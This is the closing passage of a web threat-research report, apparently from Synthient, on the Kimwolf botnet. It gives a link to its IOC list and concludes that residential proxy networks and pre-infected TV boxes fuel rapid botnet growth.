SDK unintentionally.</li></ul><h3 class="research-portable-h3" id="observables-and-iocs">Observables and IOCs</h3><p class="research-portable-paragraph">A complete list of observables and IOCs are available on the Synthient <a href="https://github.com/synthient/public-research/blob/main/2026/01/kimwolf/README.md" target="_blank" rel="noreferrer">GitHub</a>.</p><section class="research-section research-portable-section" id="conclusion"><h2>Conclusion</h2></section><p class="research-portable-paragraph">Kimwolf highlights the significant risks posed by residential proxy networks, along with their sophisticated operations that exploit the &quot;gray market&quot; of the proxy ecosystem. The botnet’s unprecedented growth to over 2 million devices is not just a failure of individual device security but a systemic vulnerability within the residential proxy supply chain. </p><p class="research-portable-paragraph">The discovery of pre-infected TV boxes and the monetization of these bots through secondary SDKs like Byteconnect indicates a deepening relationship between threat actors and commercial proxy providers. While the collaboration with IPIDEA led to a successful patch, the broader landscape remains precarious.</p><p class="research-portable-paragraph">Synthient assesses that the Kimwolf operation provides a blueprint for future botnets to achieve rapid, low-cost growth by bypassing traditional defenses. As long as demand for low-cost residential bandwidth continues to grow, the risk to organizations and individuals will remain high.</p></div></article><aside class="research-sidebar"><script nonce="h4rShgzJyC8XJggUcZIUIA==">(function(){let e=(e,t,n)=>{let r=async()=>{await(await e())()},i=typeof t.value==`object`?t.value:void 0,a={rootMargin:i==null?void 0:i.rootMargin},o=new IntersectionObserver(e=>{for(let t of e)if(t.isIntersecting){o.disconnect(),r();break}},a);for(let e of n.children)o.observe(e)};(self.Astro||(self.Astro={})).visible=e,window.dispatchEvent(new Event(`astro:visible`))})();</script><astro-island uid="2p4zQ5" prefix="r49" component-url="/_astro/ResearchTableOfContents.fJ6jsOXC.js" component-export="ResearchTableOfContents" renderer-url="/_astro/client.F28IbmiW.js" props="{&quot;headings&quot;:[1,[[0,{&quot;id&quot;:[0,&quot;executive-summary&quot;],&quot;text&quot;:[0,&quot;Executive Summary&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;background&quot;],&quot;text&quot;:[0,&quot;Background&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;infection-through-residential-proxies&quot;],&quot;text&quot;:[0,&quot;Infection through Residential Proxies&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;infection-demographic&quot;],&quot;text&quot;:[0,&quot;Infection Demographic&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;kimwolf-analysis&quot;],&quot;text&quot;:[0,&quot;Kimwolf Analysis&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;byteconnect-sdk&quot;],&quot;text&quot;:[0,&quot;Byteconnect SDK&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;byteconnect-protocol&quot;],&quot;text&quot;:[0,&quot;Byteconnect Protocol&quot;],&quot;level&quot;:[0,3]}],[0,{&quot;id&quot;:[0,&quot;notifying-impacted-parties&quot;],&quot;text&quot;:[0,&quot;Notifying Impacted Parties&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;the-proxy-ecosystem&quot;],&quot;text&quot;:[0,&quot;The Proxy Ecosystem&quot;],&quot;level&quot;:[0,2]}],[0,{&quot;id&quot;:[0,&quot;m